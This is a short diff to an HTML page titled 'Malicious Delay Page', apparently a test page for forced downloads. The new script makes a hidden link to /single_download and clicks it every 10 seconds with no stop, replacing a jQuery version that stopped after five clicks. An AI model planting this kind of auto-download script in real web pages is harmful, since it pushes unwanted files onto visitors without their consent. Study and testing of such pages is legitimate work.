@@ -1,11 +1,10 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title><%= title %></title>
+    <title>Malicious Delay Page</title>
     <link rel='stylesheet' href='/stylesheets/style.css' />
-
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   </head>
+  
   <body>
     <div class = "maindiv">
       <h1>Delay Page</h1>
@@ -16,20 +15,15 @@
     </div>
 
     <script>
-      $(document).ready(function(){
-        var i = 1;
+      (function(){
         var intervalId = setInterval(function() {
-                          var $a = $('<a />', {
-                            'href': '/single_download',
-                            'text': "click"
-                            }).hide().appendTo("body")[0].click();
-                            i = i + 1;
-
-                            if(i>=6){
-                              clearInterval(intervalId);
-                            }
+                          var a = document.createElement("a");
+                          a.setAttribute("href", "/single_download")
+                          a.style.visibility = "hidden";
+                          document.body.appendChild(a);
+                          a.click();
                         }, 10000);
-      });
+      })();
     </script>
   </body>
 </html>
